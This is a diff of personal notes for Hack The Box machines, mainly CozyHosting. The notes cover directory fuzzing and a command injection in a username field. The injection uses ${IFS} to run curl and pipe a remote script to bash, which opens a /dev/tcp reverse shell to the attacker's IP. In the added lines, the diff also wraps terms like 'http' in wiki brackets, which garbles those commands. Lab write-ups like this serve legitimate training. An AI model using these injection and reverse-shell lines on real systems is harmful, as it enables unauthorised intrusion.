@@ -43,7 +43,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 ```
 
 - Gobuster to enumerate website if machine has 80 or 443
-	- `gobuster dir -u http://precious.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt -o nameGobuster.txt -t 10`
+	- `gobuster dir -u [[http]]://precious.[[htb]] -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt -o nameGobuster.txt -t 10`
 ```bash
 
 ```
@@ -51,7 +51,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 - ffuf to enumerate website if machine has 80 or 443
 	- ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.10.10.10/FUZZ -e .php,.txt -t 10
 	- ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://10.10.10.10/FUZZ
-	- `ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://cozyhosting.htb/FUZZ -t 10 -r`
+	- `ffuf -w /usr/share/seclists/Discovery/[[DNS]]/subdomains-top1million-5000.txt -u [[http]]://cozyhosting.[[htb]]/FUZZ -t 10 -r`
 	- ffuf reveals 
 		- admin that redirects to login
 		- login page
@@ -150,8 +150,8 @@ actuator/sessions       [Status: 200, Size: 48, Words: 1, Lines: 1, Duration: 11
 	- ![[Pasted image 20250209145035.png]]
 	- using 127.0.0.1 and Your Mom for username we detect that username cannot have whitespaces
 
-	 - Spinning up a python server `python3 -m http.server 42069`
-	 - in username `test;curl${IFS}http://10.10.16.7:42069;`
+	 - Spinning up a python server `python3 -m [[http]].server 42069`
+	 - in username `test;curl${IFS}[[http]]://10.10.16.7:42069;`
 		 - ${IFS} represents the Internal Field Separator in Unix/Linux. By default, it's set to whitespace (spaces, tabs, newlines).
 	 - ![[Pasted image 20250209145926.png]]
 	```bash kali@kali  ~/htb/cozyhosting  python3 -m http.server 42069
@@ -165,7 +165,7 @@ actuator/sessions       [Status: 200, Size: 48, Words: 1, Lines: 1, Duration: 11
 	 bash -i >& /dev/tcp/10.10.16.4/42096 0>&1
 ```
 - from the command line using curl
-- `curl http://cozyhosting.htb/executessh -d 'host=127.0.0.1&username=test;curl${IFS}http://10.10.16.4:42069/yourMom.sh|bash;' `
+- `curl [[http]]://cozyhosting.[[htb]]/executessh -d 'host=127.0.0.1&username=test;curl${IFS}[[http]]://10.10.16.4:42069/yourMom.sh|bash;' `
 - Reverse Shell into app@cozyhosting.htb 
 	- looking in the directory we are dropped `app` into and we find a file called cloudhosting-0.0.1.jar.gz
 	- pull down the file from the target machine to attack box
